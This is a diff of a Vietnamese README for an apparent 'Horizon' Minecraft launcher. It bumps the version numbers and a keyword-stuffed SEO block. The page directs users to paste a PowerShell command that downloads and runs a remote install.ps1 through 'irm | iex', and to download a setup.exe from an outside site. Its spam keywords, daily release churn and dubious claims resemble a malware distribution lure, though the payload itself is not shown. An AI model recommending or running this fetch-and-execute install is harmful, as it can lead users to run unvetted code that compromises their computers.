@@ -23,7 +23,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 <p align="center">
   <strong>Cập nhật mới nhất:</strong>
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.58">0.2.58</a>
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.59">0.2.59</a>
   · <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases">Mọi cập nhật và bản vá</a>
 </p>
 
@@ -64,9 +64,9 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
   <img alt="windows" src="https://img.shields.io/badge/OS-Windows_10%2F11-0078d4">
   <img alt="fps" src="https://img.shields.io/badge/FPS-Rust_client-orange">
   <img alt="free" src="https://img.shields.io/badge/Gia-Mien_phi-success">
-  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.58-lightgrey">
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.58"><img alt="changelog" src="https://img.shields.io/badge/Changelog-0.2.58-informational"></a>
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.58-blue"></a>
+  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.59-lightgrey">
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.59"><img alt="changelog" src="https://img.shields.io/badge/Changelog-0.2.59-informational"></a>
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.59-blue"></a>
 </p>
 
 
@@ -108,10 +108,11 @@ Horizon **không** thuộc Mojang / Microsoft. Chỉ tải từ **horizonlaunche
 
 Horizon được duy trì: bản vá ra đều. Mỗi phiên bản là một release riêng kèm changelog. Setup hiện tại trên site, lịch sử vá ở đây.
 
-**Cập nhật mới nhất:** [0.2.58](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.58) · **[Mọi cập nhật và bản vá](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)** — 55 bản (0.2.0 → 0.2.58).
+**Cập nhật mới nhất:** [0.2.59](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.59) · **[Mọi cập nhật và bản vá](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)** — 56 bản (0.2.0 → 0.2.59).
 
 | Phiên bản | Ngày | |
 |---|---|---|
+| **[0.2.59](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.59)** | 2026-11-10 | [notes](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.59) |
 | **[0.2.58](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.58)** | 2026-11-09 | [notes](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.58) |
 | **[0.2.57](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57)** | 2026-11-09 | [notes](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57) |
 | **[0.2.56](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56)** | 2026-11-08 | [notes](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56) |
@@ -157,7 +158,7 @@ Cách đúng để **tải Horizon Minecraft** là site chính thức, không d�
 
 - Windows 10 / Windows 11 x64
 - `horizon-launcher-setup.exe`
-- Horizon **0.2.58**
+- Horizon **0.2.59**
 - Miễn phí · site tiếng Nga và tiếng Anh
 
 ## Cách cài Horizon — hai phương pháp
@@ -187,10 +188,10 @@ Hướng dẫn đầy đủ: [https://horizonlauncher.net/en/install-horizon/](h
 
 ### Cách 2. Cài thường (setup.exe)
 
-Cùng bộ cài Horizon — tải file, không cần lệnh. Hiện tại: **0.2.58**, Windows x64, ~64 MB.
+Cùng bộ cài Horizon — tải file, không cần lệnh. Hiện tại: **0.2.59**, Windows x64, ~60 MB.
 
 **[Tải Horizon — Windows setup](https://horizonlauncher.net/horizon-launcher-setup.exe)**  
-`horizon-launcher-setup.exe` · Windows x64 · ~64 MB · v0.2.58
+`horizon-launcher-setup.exe` · Windows x64 · ~60 MB · v0.2.59
 
 1. Tải [horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe).
 2. Chạy trình cài Windows.
@@ -244,7 +245,7 @@ Không cần cho client Rust của Horizon.
 
 `tải Horizon` `launcher Horizon` `Minecraft Rust` `Minecraft Rust Edition` `FPS Minecraft` `horizonlauncher.net` `Win+R Horizon` `Horizon Win+R install` `Horizon setup.exe`
 
-`скачать Horizon` `скачать Horizon бесплатно` `скачать Horizon Minecraft` `скачать Horizon лаунчер` `скачать Horizon Windows` `скачать Horizon Windows 10` `скачать Horizon Windows 11` `скачать Horizon x64` `скачать Horizon 64 bit` `скачать Horizon setup` `скачать Horizon exe` `скачать Horizon installer` `скачать Horizon установщик` `скачать Horizon 0.2.58` `скачать Horizon 2026` `скачать Horizon официальный` `скачать Horizon с официального сайта` `скачать Horizon horizonlauncher.net` `скачать Horizon github` `скачать Horizon launcher github` `Horizon Minecraft скачать` `Horizon Minecraft бесплатно` `Horizon Minecraft лаунчер` `Horizon Minecraft Windows` `Horizon Minecraft Rust` `Horizon Minecraft на Rust` `Horizon Minecraft Rust Edition` `лаунчер Horizon` `лаунчер Horizon скачать` `лаунчер Horizon Windows` `лаунчер Horizon Minecraft` `лаунчер Horizon Minecraft Java` `установить Horizon` `установка Horizon` `как скачать Horizon` `как установить Horizon` `как поставить Horizon` `быстрая установка Horizon` `обычная установка Horizon` `Win+R Horizon` `Horizon Win+R` `команда Win+R Horizon` `powershell Horizon` `irm install.ps1 Horizon` `install.ps1 horizonlauncher.net` `horizon-launcher-setup.exe` `Horizon setup.exe` `Minecraft на Rust` `Minecraft Rust Edition` `клиент Minecraft на Rust` `клиент Minecraft Rust` `Rust клиент Minecraft` `нативный клиент Minecraft` `Minecraft без JVM` `Minecraft без Java` `Minecraft Java на Rust` `альтернатива официальному лаунчеру Minecraft` `лаунчер Minecraft Windows` `лаунчер Minecraft Java` `скачать лаунчер Minecraft` `лучший лаунчер Minecraft FPS` `высокий FPS Minecraft` `поднять FPS Minecraft` `Minecraft не лагает` `оптимизация Minecraft Java` `FPS Minecraft Java` `Horizon 0.2.58` `Horizon launcher` `download Horizon` `download Horizon Minecraft` `download Horizon launcher` `download Horizon Windows setup` `Horizon Minecraft launcher download` `Minecraft on Rust` `Minecraft Rust Edition download` `Rust Minecraft client` `Horizon Rust Edition` `free Horizon launcher` `Horizon github` `Horizon Minecraft GitHub` `GitHub Horizon launcher`
+`скачать Horizon` `скачать Horizon бесплатно` `скачать Horizon Minecraft` `скачать Horizon лаунчер` `скачать Horizon Windows` `скачать Horizon Windows 10` `скачать Horizon Windows 11` `скачать Horizon x64` `скачать Horizon 64 bit` `скачать Horizon setup` `скачать Horizon exe` `скачать Horizon installer` `скачать Horizon установщик` `скачать Horizon 0.2.59` `скачать Horizon 2026` `скачать Horizon официальный` `скачать Horizon с официального сайта` `скачать Horizon horizonlauncher.net` `скачать Horizon github` `скачать Horizon launcher github` `Horizon Minecraft скачать` `Horizon Minecraft бесплатно` `Horizon Minecraft лаунчер` `Horizon Minecraft Windows` `Horizon Minecraft Rust` `Horizon Minecraft на Rust` `Horizon Minecraft Rust Edition` `лаунчер Horizon` `лаунчер Horizon скачать` `лаунчер Horizon Windows` `лаунчер Horizon Minecraft` `лаунчер Horizon Minecraft Java` `установить Horizon` `установка Horizon` `как скачать Horizon` `как установить Horizon` `как поставить Horizon` `быстрая установка Horizon` `обычная установка Horizon` `Win+R Horizon` `Horizon Win+R` `команда Win+R Horizon` `powershell Horizon` `irm install.ps1 Horizon` `install.ps1 horizonlauncher.net` `horizon-launcher-setup.exe` `Horizon setup.exe` `Minecraft на Rust` `Minecraft Rust Edition` `клиент Minecraft на Rust` `клиент Minecraft Rust` `Rust клиент Minecraft` `нативный клиент Minecraft` `Minecraft без JVM` `Minecraft без Java` `Minecraft Java на Rust` `альтернатива официальному лаунчеру Minecraft` `лаунчер Minecraft Windows` `лаунчер Minecraft Java` `скачать лаунчер Minecraft` `лучший лаунчер Minecraft FPS` `высокий FPS Minecraft` `поднять FPS Minecraft` `Minecraft не лагает` `оптимизация Minecraft Java` `FPS Minecraft Java` `Horizon 0.2.59` `Horizon launcher` `download Horizon` `download Horizon Minecraft` `download Horizon launcher` `download Horizon Windows setup` `Horizon Minecraft launcher download` `Minecraft on Rust` `Minecraft Rust Edition download` `Rust Minecraft client` `Horizon Rust Edition` `free Horizon launcher` `Horizon github` `Horizon Minecraft GitHub` `GitHub Horizon launcher`
 
 ### Tải Horizon / Win+R / setup.exe
 
